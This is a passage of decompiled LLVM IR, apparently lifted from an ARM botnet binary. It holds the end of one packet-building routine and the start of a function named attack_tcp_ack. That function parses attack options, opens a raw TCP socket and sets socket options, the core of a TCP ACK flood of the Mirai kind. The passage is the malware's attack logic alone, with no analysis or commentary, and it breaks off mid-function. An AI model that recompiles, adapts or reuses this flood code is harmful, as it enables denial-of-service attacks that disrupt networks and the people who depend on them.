  %v3_9cb0 = inttoptr i32 %v2_9cb0 to i32*
  store i32 %v7_9ca4, i32* %v3_9cb0, align 4
  %v0_9cb4 = load i32, i32* %r3.global-to-local, align 4
  %v1_9cb4 = add i32 %v0_9cb4, 12
  %v2_9cb4 = inttoptr i32 %v1_9cb4 to i16*
  %v3_9cb4 = load i16, i16* %v2_9cb4, align 2
  %v4_9cb4 = zext i16 %v3_9cb4 to i32
  store i32 %v4_9cb4, i32* %r1.global-to-local, align 4
  %v0_9cb8 = load i32, i32* %ip.global-to-local, align 4
  %v1_9cb8 = add i32 %v0_9cb8, 40
  store i32 %v1_9cb8, i32* @r4, align 4
  %v3_9cbc = add i32 %v0_9cb8, 20
  %v4_9cbc = inttoptr i32 %v3_9cbc to i16*
  store i16 %v3_9cb4, i16* %v4_9cbc, align 2
  store i32 %v0_9c78, i32* %ip.global-to-local, align 4
  %v0_9cc4 = load i32, i32* %r3.global-to-local, align 4
  %v1_9cc4 = add i32 %v0_9cc4, 8
  %v2_9cc4 = inttoptr i32 %v1_9cc4 to i32*
  %v3_9cc4 = load i32, i32* %v2_9cc4, align 4
  store i32 %v3_9cc4, i32* %r1.global-to-local, align 4
  %v2_9cc8 = add i32 %v0_9c78, 4
  %v3_9cc8 = inttoptr i32 %v2_9cc8 to i32*
  store i32 %v3_9cc4, i32* %v3_9cc8, align 4
  %v0_9ccc = load i32, i32* %ip.global-to-local, align 4
  %v1_9ccc = add i32 %v0_9ccc, 13
  %v2_9ccc = inttoptr i32 %v1_9ccc to i8*
  %v3_9ccc = load i8, i8* %v2_9ccc, align 1
  %v4_9ccc = zext i8 %v3_9ccc to i32
  store i32 %v4_9ccc, i32* %r2.global-to-local, align 4
  %v0_9cd0 = load i32, i32* %r3.global-to-local, align 4
  %v1_9cd0 = add i32 %v0_9cd0, 4
  %v2_9cd0 = inttoptr i32 %v1_9cd0 to i32*
  %v3_9cd0 = load i32, i32* %v2_9cd0, align 4
  store i32 %v3_9cd0, i32* %r1.global-to-local, align 4
  %v1_9cd4 = add i32 %v0_9cd0, 14
  %v2_9cd4 = inttoptr i32 %v1_9cd4 to i16*
  %v3_9cd4 = load i16, i16* %v2_9cd4, align 2
  %v4_9cd4 = zext i16 %v3_9cd4 to i32
  store i32 %v4_9cd4, i32* %r3.global-to-local, align 4
  %v1_9cd8 = or i32 %v4_9ccc, 1
  store i32 %v1_9cd8, i32* %r2.global-to-local, align 4
  %v3_9cdc = add i32 %v0_9ccc, 2
  %v4_9cdc = inttoptr i32 %v3_9cdc to i16*
  store i16 %v3_9cd4, i16* %v4_9cdc, align 2
  %v0_9ce0 = load i32, i32* %r2.global-to-local, align 4
  %v1_9ce0 = trunc i32 %v0_9ce0 to i8
  %v2_9ce0 = load i32, i32* %ip.global-to-local, align 4
  %v3_9ce0 = add i32 %v2_9ce0, 13
  %v4_9ce0 = inttoptr i32 %v3_9ce0 to i8*
  store i8 %v1_9ce0, i8* %v4_9ce0, align 1
  %v0_9ce4 = load i32, i32* %ip.global-to-local, align 4
  %v1_9ce4 = add i32 %v0_9ce4, 12
  %v2_9ce4 = inttoptr i32 %v1_9ce4 to i8*
  %v3_9ce4 = load i8, i8* %v2_9ce4, align 1
  %v4_9ce4 = zext i8 %v3_9ce4 to i32
  store i32 %v4_9ce4, i32* %r3.global-to-local, align 4
  %v1_9ce8 = add i32 %v0_9ce4, 13
  %v2_9ce8 = inttoptr i32 %v1_9ce8 to i8*
  %v3_9ce8 = load i8, i8* %v2_9ce8, align 1
  %v4_9ce8 = zext i8 %v3_9ce8 to i32
  %tmp103 = urem i8 %v3_9ce4, 16
  %v1_9cec = zext i8 %tmp103 to i32
  %v1_9cf0 = or i32 %v1_9cec, 128
  store i32 %v1_9cf0, i32* %r3.global-to-local, align 4
  %v1_9cf4 = or i32 %v4_9ce8, 16
  store i32 %v1_9cf4, i32* %r2.global-to-local, align 4
  %v0_9cf8 = load i32, i32* %r1.global-to-local, align 4
  %v2_9cf8 = add i32 %v0_9ce4, 8
  %v3_9cf8 = inttoptr i32 %v2_9cf8 to i32*
  store i32 %v0_9cf8, i32* %v3_9cf8, align 4
  %v0_9cfc = load i32, i32* %r3.global-to-local, align 4
  %v1_9cfc = trunc i32 %v0_9cfc to i8
  %v2_9cfc = load i32, i32* %ip.global-to-local, align 4
  %v3_9cfc = add i32 %v2_9cfc, 12
  %v4_9cfc = inttoptr i32 %v3_9cfc to i8*
  store i8 %v1_9cfc, i8* %v4_9cfc, align 1
  %v0_9d00 = load i32, i32* %r2.global-to-local, align 4
  %v1_9d00 = trunc i32 %v0_9d00 to i8
  %v2_9d00 = load i32, i32* %ip.global-to-local, align 4
  %v3_9d00 = add i32 %v2_9d00, 13
  %v4_9d00 = inttoptr i32 %v3_9d00 to i8*
  store i8 %v1_9d00, i8* %v4_9d00, align 1
  %v0_9d04 = call i32 @rand_next()
  %v1_9d04 = trunc i32 %v0_9d04 to i16
  store i32 %v0_9d04, i32* %r0.global-to-local, align 4
  store i32 %v0_9c78, i32* %lr.global-to-local, align 4
  store i32 %v1_96ac, i32* %r1.global-to-local, align 4
  %v1_9d10 = add i32 %v0_9c78, 13
  %v2_9d10 = inttoptr i32 %v1_9d10 to i8*
  %v3_9d10 = load i8, i8* %v2_9d10, align 1
  %v4_9d10 = zext i8 %v3_9d10 to i32
  store i32 %v1_9d14, i32* %r2.global-to-local, align 4
  %v1_9d18 = and i32 %v4_9d10, 223
  %v5_9d1c = or i32 %v1_9d18, %v4_9d1c
  store i32 %v5_9d1c, i32* %r3.global-to-local, align 4
  %v1_9d20 = trunc i32 %v5_9d1c to i8
  store i8 %v1_9d20, i8* %v2_9d10, align 1
  store i32 %v1_96cc, i32* %ip.global-to-local, align 4
  %v0_9d28 = load i32, i32* %lr.global-to-local, align 4
  %v1_9d28 = add i32 %v0_9d28, 13
  %v2_9d28 = inttoptr i32 %v1_9d28 to i8*
  %v3_9d28 = load i8, i8* %v2_9d28, align 1
  %v4_9d28 = zext i8 %v3_9d28 to i32
  store i32 %v1_9d2c, i32* %r3.global-to-local, align 4
  %v1_9d30 = and i32 %v4_9d28, 239
  %v5_9d34 = or i32 %v1_9d30, %v4_9d34
  store i32 %v5_9d34, i32* %r2.global-to-local, align 4
  %v1_9d38 = trunc i32 %v5_9d34 to i8
  store i8 %v1_9d38, i8* %v2_9d28, align 1
  %v0_9d3c = load i32, i32* %lr.global-to-local, align 4
  %v1_9d3c = add i32 %v0_9d3c, 13
  %v2_9d3c = inttoptr i32 %v1_9d3c to i8*
  %v3_9d3c = load i8, i8* %v2_9d3c, align 1
  %v4_9d3c = zext i8 %v3_9d3c to i32
  store i32 %v1_96ec, i32* %lr.global-to-local, align 4
  store i32 %v0_9c78, i32* %r1.global-to-local, align 4
  store i32 %v1_9d48, i32* %r2.global-to-local, align 4
  %v1_9d4c = and i32 %v4_9d3c, 247
  %v5_9d50 = or i32 %v1_9d4c, %v4_9d50
  store i32 %v5_9d50, i32* %r3.global-to-local, align 4
  %v1_9d54 = trunc i32 %v5_9d50 to i8
  store i8 %v1_9d54, i8* %v2_9d10, align 1
  store i32 %v1_970c, i32* %ip.global-to-local, align 4
  %v0_9d5c = load i32, i32* %r1.global-to-local, align 4
  %v1_9d5c = add i32 %v0_9d5c, 13
  %v2_9d5c = inttoptr i32 %v1_9d5c to i8*
  %v3_9d5c = load i8, i8* %v2_9d5c, align 1
  %v4_9d5c = zext i8 %v3_9d5c to i32
  store i32 %v1_9d60, i32* %r3.global-to-local, align 4
  %v1_9d64 = and i32 %v4_9d5c, 251
  %v5_9d68 = or i32 %v1_9d64, %v4_9d68
  store i32 %v5_9d68, i32* %r2.global-to-local, align 4
  %v1_9d6c = trunc i32 %v5_9d68 to i8
  store i8 %v1_9d6c, i8* %v2_9d5c, align 1
  store i32 %v1_972c, i32* @lr, align 4
  %v0_9d74 = load i32, i32* %r1.global-to-local, align 4
  %v1_9d74 = add i32 %v0_9d74, 13
  %v2_9d74 = inttoptr i32 %v1_9d74 to i8*
  %v3_9d74 = load i8, i8* %v2_9d74, align 1
  %v4_9d74 = zext i8 %v3_9d74 to i32
  store i32 %v1_9d78, i32* %r2.global-to-local, align 4
  %v1_9d7c = and i32 %v4_9d74, 253
  %v4_9d80 = or i32 %v1_9d7c, %v3_9d80
  store i32 %v4_9d80, i32* %r3.global-to-local, align 4
  %v1_9d84 = trunc i32 %v4_9d80 to i8
  store i8 %v1_9d84, i8* %v2_9d74, align 1
  %v0_9d88 = load i32, i32* %r1.global-to-local, align 4
  %v1_9d88 = add i32 %v0_9d88, 13
  %v2_9d88 = inttoptr i32 %v1_9d88 to i8*
  %v3_9d88 = load i8, i8* %v2_9d88, align 1
  %v4_9d88 = zext i8 %v3_9d88 to i32
  %v1_9d90 = and i32 %v4_9d88, 254
  %v2_9d98 = or i32 %v1_9d90, %v1_9d94
  store i32 %v2_9d98, i32* %r3.global-to-local, align 4
  store i32 %v0_9c78, i32* %r2.global-to-local, align 4
  %v1_9da0 = trunc i32 %v2_9d98 to i8
  store i8 %v1_9da0, i8* %v2_9d10, align 1
  %v3_9da4 = load i32, i32* %r2.global-to-local, align 4
  %v4_9da4 = add i32 %v3_9da4, 14
  %v5_9da4 = inttoptr i32 %v4_9da4 to i16*
  store i16 %v1_9d04, i16* %v5_9da4, align 2
  store i32 %v6_9764, i32* %r1.global-to-local, align 4
  %v0_9dac = load i32, i32* @r4, align 4
  store i32 %v0_9dac, i32* %r0.global-to-local, align 4
  %v2_9db0 = call i32 @rand_alphastr(i32 %v0_9dac, i32 %v6_9764)
  store i32 %v2_9db0, i32* %r0.global-to-local, align 4
  store i32 %v6_9764, i32* %ip.global-to-local, align 4
  %v2_9dbc = load i32, i32* @r4, align 4
  %v4_9dbc = add i32 %v2_9dbc, %v6_9764
  %v5_9dbc = inttoptr i32 %v4_9dbc to i8*
  store i8 0, i8* %v5_9dbc, align 1
  %v3_9dc0 = load i32, i32* %stack_var_-44, align 4
  store i32 %arg2, i32* @lr, align 4
  %v1_9dc8 = add i32 %v3_9dc0, 1
  store i32 %v1_9dc8, i32* @r3, align 4
  store i32 %v1_9dc8, i32* %stack_var_-44, align 4
  %v5_9dd4 = icmp slt i32 %v1_9dc8, %arg2
  br i1 %v5_9dd4, label %dec_label_pc_97fc.outer, label %dec_label_pc_9988.preheader

; uselistorder directives
  uselistorder i32 %v1_9dc8, { 1, 0, 2 }
  uselistorder i8* %v2_9d10, { 2, 0, 1, 3 }
  uselistorder i32 %v0_9d04, { 1, 0 }
  uselistorder i32 %v0_9c78, { 1, 2, 4, 3, 6, 5, 0 }
  uselistorder i32 %v3_9bc4, { 0, 1, 3, 2 }
  uselistorder i32 %v3_9b94, { 0, 2, 1, 3 }
  uselistorder i32 %v2_9b70, { 1, 2, 0 }
  uselistorder i32 %v0_9b50, { 1, 0 }
  uselistorder i32 %v0_9b0c, { 0, 2, 1, 3 }
  uselistorder i32 %v7_9aa0, { 0, 2, 3, 1 }
  uselistorder i32 %v1_9a88, { 1, 2, 0, 3 }
  uselistorder i32 %v5_9a50, { 1, 0 }
  uselistorder i32 %v4_9a40, { 1, 0 }
  uselistorder i32 %v3_9a0c, { 1, 0 }
  uselistorder i32 %v3_99ec, { 3, 2, 0, 1 }
  uselistorder i32 %v2_99d8, { 1, 0 }
  uselistorder i32 %v3_99b0, { 1, 0 }
  uselistorder i32 %v1_99a4, { 2, 0, 1 }
  uselistorder i32 %v1_9978, { 1, 0, 2 }
  uselistorder i32 %v3_9960, { 0, 2, 3, 1 }
  uselistorder i32 %v4_9928, { 1, 0 }
  uselistorder i16 %stack_var_-62.2, { 0, 3, 1, 2 }
  uselistorder i32 %v0_986c, { 1, 0, 2 }
  uselistorder i32 %v0_9b90, { 1, 0, 4, 5, 2, 3 }
  uselistorder i32 %v4_985c, { 1, 0 }
  uselistorder i1 %v7_9854, { 1, 0 }
  uselistorder i32 %v3_9808, { 1, 2, 0, 3 }
  uselistorder i32 %stack_var_-60.0, { 1, 0 }
  uselistorder i16 %stack_var_-62.0, { 1, 0 }
  uselistorder i32 %stack_var_-340.0.ph, { 3, 4, 1, 2, 0 }
  uselistorder i32 %v1_9d78, { 1, 0 }
  uselistorder i32 %v1_9d60, { 1, 0 }
  uselistorder i32 %v1_9d2c, { 1, 0 }
  uselistorder i32 %v3_9920, { 1, 0 }
  uselistorder i32 %v1_9d48, { 1, 0 }
  uselistorder i32 %v1_9d14, { 1, 0 }
  uselistorder i32 %v4_9c2c, { 4, 2, 3, 0, 1 }
  uselistorder i32 %v1_9bec, { 2, 0, 1 }
  uselistorder i32 %v1_9938, { 1, 0 }
  uselistorder i32 %v4_9934, { 2, 0, 1 }
  uselistorder i32 %v2_9840, { 3, 2, 1, 4, 0 }
  uselistorder i16 %v5_97f4, { 1, 0 }
  uselistorder i32 %v0_97e4, { 1, 0 }
  uselistorder i32 %v3_97a8, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_9794, { 1, 0 }
  uselistorder i32 %v1_9784, { 2, 1, 0 }
  uselistorder i32 %v6_9764, { 2, 7, 6, 5, 8, 3, 12, 11, 10, 13, 4, 0, 9, 1 }
  uselistorder i32 %v1_974c, { 1, 0 }
  uselistorder i32 %v1_972c, { 1, 2, 0 }
  uselistorder i32 %v1_970c, { 1, 2, 0 }
  uselistorder i32 %v1_96ec, { 1, 2, 0 }
  uselistorder i32 %v1_96cc, { 1, 2, 0 }
  uselistorder i32 %v1_96ac, { 1, 2, 0 }
  uselistorder i32 %v6_9688, { 1, 0 }
  uselistorder i32 %v1_9670, { 1, 2, 0 }
  uselistorder i32 %v6_9644, { 1, 2, 0 }
  uselistorder i32 %v6_9608, { 1, 2, 0 }
  uselistorder i32 %v2_95f0, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v2_95e0, { 3, 4, 0, 5, 1, 6, 2, 7 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 17, 15, 16 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 44, 45, 29, 30, 31, 32, 33, 34, 35, 36, 37, 43, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 38, 39, 40, 41, 42, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 45, 44, 46, 47, 48, 49, 50, 51, 52, 27, 28, 29, 30, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 32, 20, 21, 29, 30, 31, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 22, 49, 23, 25, 24, 26, 28, 27, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 7, 3, 4, 5, 6, 12, 8, 9, 10, 11, 14, 13, 16, 15, 17, 19, 18, 22, 20, 32, 21, 23, 25, 24, 35, 33, 34, 36, 37, 38, 40, 41, 39, 42, 44, 43, 46, 45, 49, 48, 47, 50, 52, 51, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 26, 27, 28, 29, 30, 31, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 29, 30, 31 }
  uselistorder i32 %arg2, { 3, 2, 1, 6, 7, 5, 4, 0, 8, 10, 9, 11, 12, 13 }
  uselistorder label %.thread10, { 1, 0 }
  uselistorder label %dec_label_pc_9aec, { 1, 3, 0, 2 }
  uselistorder label %dec_label_pc_9ab8, { 1, 0 }
  uselistorder label %dec_label_pc_99c8, { 1, 0 }
  uselistorder label %dec_label_pc_9988, { 1, 0 }
  uselistorder label %dec_label_pc_98b4, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_9888, { 1, 0 }
  uselistorder label %dec_label_pc_9864, { 1, 0 }
  uselistorder label %bb72, { 1, 0 }
  uselistorder label %dec_label_pc_9818, { 1, 0 }
  uselistorder label %dec_label_pc_97fc, { 1, 0 }
  uselistorder label %dec_label_pc_97fc.outer, { 1, 0 }
}

define i32 @attack_tcp_ack(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v18_9de0 = load i32, i32* @sb, align 4
  %v24_9de0 = load i32, i32* @fp, align 4
  %v27_9de0 = load i32, i32* @lr, align 4
  store i32 0, i32* @sl, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg5, i32* @r4, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_9e0c = call i32 @calloc(i32 %arg2, i32 4)
  %v0_9e10 = load i32, i32* @r4, align 4
  store i32 %v0_9e10, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_9e1c = load i32, i32* @sl, align 4
  store i32 %v0_9e1c, i32* %r3.global-to-local, align 4
  %v0_9e20 = load i32, i32* @r5, align 4
  store i32 %v0_9e20, i32* %r0.global-to-local, align 4
  %v5_9e24 = inttoptr i32 %v0_9e10 to i32*
  %v6_9e24 = call i32 @attack_get_opt_int(i32 %v0_9e20, i32* %v5_9e24, i32 2, i32 %v0_9e1c, i32 %v2_9e0c)
  %v1_9e30 = urem i32 %v6_9e24, 256
  store i32 %v1_9e30, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_9e3c = load i32, i32* @r4, align 4
  store i32 %v0_9e3c, i32* %r1.global-to-local, align 4
  %v0_9e40 = load i32, i32* @r5, align 4
  store i32 %v0_9e40, i32* %r0.global-to-local, align 4
  %v5_9e44 = trunc i32 %v6_9e24 to i8
  %v6_9e48 = inttoptr i32 %v0_9e3c to i32*
  %v7_9e48 = call i32 @attack_get_opt_int(i32 %v0_9e40, i32* %v6_9e48, i32 3, i32 65535, i32 %v6_9e24)
  %v0_9e4c = load i32, i32* @r4, align 4
  store i32 %v0_9e4c, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_9e5c = load i32, i32* @r5, align 4
  store i32 %v0_9e5c, i32* %r0.global-to-local, align 4
  %v5_9e60 = inttoptr i32 %v0_9e4c to i32*
  %v6_9e60 = call i32 @attack_get_opt_int(i32 %v0_9e5c, i32* %v5_9e60, i32 4, i32 64, i32 %v7_9e48)
  %v1_9e68 = urem i32 %v6_9e60, 256
  store i32 %v1_9e68, i32* %ip.global-to-local, align 4
  %v0_9e6c = load i32, i32* @r4, align 4
  store i32 %v0_9e6c, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v0_9e74 = load i32, i32* @sl, align 4
  store i32 %v0_9e74, i32* %r3.global-to-local, align 4
  %v0_9e78 = load i32, i32* @r5, align 4
  store i32 %v0_9e78, i32* %r0.global-to-local, align 4
  %v6_9e80 = inttoptr i32 %v0_9e6c to i32*
  %v7_9e80 = call i32 @attack_get_opt_int(i32 %v0_9e78, i32* %v6_9e80, i32 5, i32 %v0_9e74, i32 %v1_9e68)
  %v1_9e8c = urem i32 %v7_9e80, 256
  store i32 %v1_9e8c, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_9e98 = load i32, i32* @r4, align 4
  store i32 %v0_9e98, i32* %r1.global-to-local, align 4
  %v0_9e9c = load i32, i32* @r5, align 4
  store i32 %v0_9e9c, i32* %r0.global-to-local, align 4
  %v5_9ea4 = inttoptr i32 %v0_9e98 to i32*
  %v6_9ea4 = call i32 @attack_get_opt_int(i32 %v0_9e9c, i32* %v5_9ea4, i32 6, i32 65535, i32 %v1_9e8c)
  %v0_9eac = load i32, i32* @r4, align 4
  store i32 %v0_9eac, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_9ea4, i32* %fp.global-to-local, align 4
  %v0_9ebc = load i32, i32* @r5, align 4
  store i32 %v0_9ebc, i32* %r0.global-to-local, align 4
  %v5_9ec0 = inttoptr i32 %v0_9eac to i32*
  %v6_9ec0 = call i32 @attack_get_opt_int(i32 %v0_9ebc, i32* %v5_9ec0, i32 7, i32 65535, i32 ptrtoint (i32* @0 to i32))
  %v0_9ec8 = load i32, i32* @r4, align 4
  store i32 %v0_9ec8, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 %v6_9ec0, i32* %sb.global-to-local, align 4
  %v0_9ed8 = load i32, i32* @r5, align 4
  store i32 %v0_9ed8, i32* %r0.global-to-local, align 4
  %v5_9edc = inttoptr i32 %v0_9ec8 to i32*
  %v6_9edc = call i32 @attack_get_opt_int(i32 %v0_9ed8, i32* %v5_9edc, i32 16, i32 65535, i32 ptrtoint (i32* @0 to i32))
  %v0_9ee8 = load i32, i32* @r4, align 4
  store i32 %v0_9ee8, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  %v0_9ef4 = load i32, i32* @r5, align 4
  store i32 %v0_9ef4, i32* %r0.global-to-local, align 4
  %v5_9ef8 = inttoptr i32 %v0_9ee8 to i32*
  %v6_9ef8 = call i32 @attack_get_opt_int(i32 %v0_9ef4, i32* %v5_9ef8, i32 17, i32 65535, i32 %v6_9edc)
  %v0_9efc = load i32, i32* @r4, align 4
  store i32 %v0_9efc, i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v0_9f08 = load i32, i32* @sl, align 4
  store i32 %v0_9f08, i32* %r3.global-to-local, align 4
  %v0_9f0c = load i32, i32* @r5, align 4
  store i32 %v0_9f0c, i32* %r0.global-to-local, align 4
  %v5_9f10 = inttoptr i32 %v0_9efc to i32*
  %v6_9f10 = call i32 @attack_get_opt_int(i32 %v0_9f0c, i32* %v5_9f10, i32 10, i32 %v0_9f08, i32 %v6_9ef8)
  %v0_9f14 = load i32, i32* @r4, align 4
  store i32 %v0_9f14, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9f24 = load i32, i32* @r5, align 4
  store i32 %v0_9f24, i32* %r0.global-to-local, align 4
  %v5_9f28 = inttoptr i32 %v0_9f14 to i32*
  %v6_9f28 = call i32 @attack_get_opt_int(i32 %v0_9f24, i32* %v5_9f28, i32 11, i32 1, i32 %v6_9f10)
  %v0_9f2c = load i32, i32* @r4, align 4
  store i32 %v0_9f2c, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v0_9f38 = load i32, i32* @sl, align 4
  store i32 %v0_9f38, i32* %r3.global-to-local, align 4
  %v0_9f3c = load i32, i32* @r5, align 4
  store i32 %v0_9f3c, i32* %r0.global-to-local, align 4
  %v5_9f40 = inttoptr i32 %v0_9f2c to i32*
  %v6_9f40 = call i32 @attack_get_opt_int(i32 %v0_9f3c, i32* %v5_9f40, i32 12, i32 %v0_9f38, i32 %v6_9f28)
  %v0_9f44 = load i32, i32* @r4, align 4
  store i32 %v0_9f44, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_9f50 = load i32, i32* @sl, align 4
  store i32 %v0_9f50, i32* %r3.global-to-local, align 4
  %v0_9f54 = load i32, i32* @r5, align 4
  store i32 %v0_9f54, i32* %r0.global-to-local, align 4
  %v5_9f58 = inttoptr i32 %v0_9f44 to i32*
  %v6_9f58 = call i32 @attack_get_opt_int(i32 %v0_9f54, i32* %v5_9f58, i32 13, i32 %v0_9f50, i32 %v6_9f40)
  %v0_9f5c = load i32, i32* @r4, align 4
  store i32 %v0_9f5c, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  %v0_9f68 = load i32, i32* @sl, align 4
  store i32 %v0_9f68, i32* %r3.global-to-local, align 4
  %v0_9f6c = load i32, i32* @r5, align 4
  store i32 %v0_9f6c, i32* %r0.global-to-local, align 4
  %v5_9f70 = inttoptr i32 %v0_9f5c to i32*
  %v6_9f70 = call i32 @attack_get_opt_int(i32 %v0_9f6c, i32* %v5_9f70, i32 14, i32 %v0_9f68, i32 %v6_9f58)
  %v0_9f74 = load i32, i32* @r4, align 4
  store i32 %v0_9f74, i32* %r1.global-to-local, align 4
  %v0_9f7c = load i32, i32* @sl, align 4
  store i32 %v0_9f7c, i32* %r3.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_9f84 = load i32, i32* @r5, align 4
  store i32 %v0_9f84, i32* %r0.global-to-local, align 4
  %v5_9f88 = inttoptr i32 %v0_9f74 to i32*
  %v6_9f88 = call i32 @attack_get_opt_int(i32 %v0_9f84, i32* %v5_9f88, i32 15, i32 %v0_9f7c, i32 %v6_9f70)
  %v0_9f8c = load i32, i32* @r4, align 4
  store i32 %v0_9f8c, i32* %r1.global-to-local, align 4
  %v0_9f94 = load i32, i32* @sl, align 4
  store i32 %v0_9f94, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  %v0_9f9c = load i32, i32* @r5, align 4
  store i32 %v0_9f9c, i32* %r0.global-to-local, align 4
  %v5_9fa0 = inttoptr i32 %v0_9f8c to i32*
  %v6_9fa0 = call i32 @attack_get_opt_int(i32 %v0_9f9c, i32* %v5_9fa0, i32 %v0_9f94, i32 512, i32 %v6_9f88)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9fac = load i32, i32* @r4, align 4
  store i32 %v0_9fac, i32* %r1.global-to-local, align 4
  store i32 %v6_9fa0, i32* @r8, align 4
  %v0_9fb4 = load i32, i32* @r5, align 4
  store i32 %v0_9fb4, i32* %r0.global-to-local, align 4
  %v5_9fb8 = inttoptr i32 %v0_9fac to i32*
  %v6_9fb8 = call i32 @attack_get_opt_int(i32 %v0_9fb4, i32* %v5_9fb8, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v2_9fc4 = load i32, i32* @global_var_23a4c.55, align 4
  store i32 %v2_9fc4, i32* %r3.global-to-local, align 4
  %v1_9fc8 = urem i32 %v6_9fb8, 256
  store i32 %v1_9fc8, i32* %ip.global-to-local, align 4
  %v0_9fcc = load i32, i32* @r4, align 4
  store i32 %v0_9fcc, i32* %r1.global-to-local, align 4
  store i32 24, i32* %r2.global-to-local, align 4
  %v0_9fd4 = load i32, i32* @r5, align 4
  store i32 %v0_9fd4, i32* %r0.global-to-local, align 4
  %v5_9fdc = inttoptr i32 %v0_9fcc to i32*
  %v6_9fdc = call i32 @attack_get_opt_ip(i32 %v0_9fd4, i32* %v5_9fdc, i32 24, i32 %v2_9fc4, i32 %v1_9fc8)
  %v0_9fe4 = load i32, i32* @sl, align 4
  store i32 %v0_9fe4, i32* %r0.global-to-local, align 4
  %v1_9fe8 = inttoptr i32 %v0_9fe4 to i32*
  %v2_9fe8 = call i32 @__GI_time(i32* %v1_9fe8)
  %v1_9fec = load i32, i32* @r6, align 4
  %v2_9fec = add i32 %v1_9fec, %v2_9fe8
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_a000 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_a000, i32* %r0.global-to-local, align 4
  %v7_a004 = icmp eq i32 %v3_a000, -1
  store i1 %v7_a004, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a004, label %dec_label_pc_a4e8, label %dec_label_pc_a010

dec_label_pc_a010:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_a018 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_a018, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  %v0_a020 = load i32, i32* @sl, align 4
  store i32 %v0_a020, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_a02c = call i32 @__GI_setsockopt(i32 %v3_a000, i32 %v0_a020, i32 3, i32 %v6_a018, i32 4)
  store i32 %v5_a02c, i32* %r0.global-to-local, align 4
  %v7_a030 = icmp eq i32 %v5_a02c, -1
